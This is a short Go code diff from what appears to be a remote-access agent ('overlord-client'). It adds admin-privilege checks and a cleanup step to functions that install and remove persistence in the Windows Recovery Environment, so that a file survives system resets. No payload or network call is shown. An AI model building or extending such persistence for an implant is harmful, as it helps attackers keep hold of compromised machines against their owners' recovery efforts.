@@ -15,6 +15,8 @@ import (
 	"time"
 
 	"overlord-client/cmd/agent/runtime"
+
+	"golang.org/x/sys/windows"
 )
 
 const (
@@ -217,6 +219,8 @@ func addNewPhase(cfg *resetConfig, phaseName, fileName string, duration int) {
 }
 
 func installWinREPersistence(fileBytes []byte, ext string) error {
+	_ = uninstallWinREPersistence()
+
 	if err := createOEMEnvironment(); err != nil {
 		return err
 	}
@@ -258,6 +262,10 @@ func uninstallWinREPersistence() error {
 }
 
 func handleWinREInstall(ctx context.Context, env *runtime.Env, cmdID string, filePath string, useSelf bool) error {
+	if !windows.GetCurrentProcessToken().IsElevated() {
+		return fmt.Errorf("WinRE persistence requires admin privileges")
+	}
+
 	var fileBytes []byte
 	var ext string
 
@@ -299,5 +307,8 @@ func handleWinREInstall(ctx context.Context, env *runtime.Env, cmdID string, fil
 }
 
 func handleWinREUninstall(ctx context.Context, env *runtime.Env, cmdID string) error {
+	if !windows.GetCurrentProcessToken().IsElevated() {
+		return fmt.Errorf("WinRE uninstall requires admin privileges")
+	}
 	return uninstallWinREPersistence()
 }
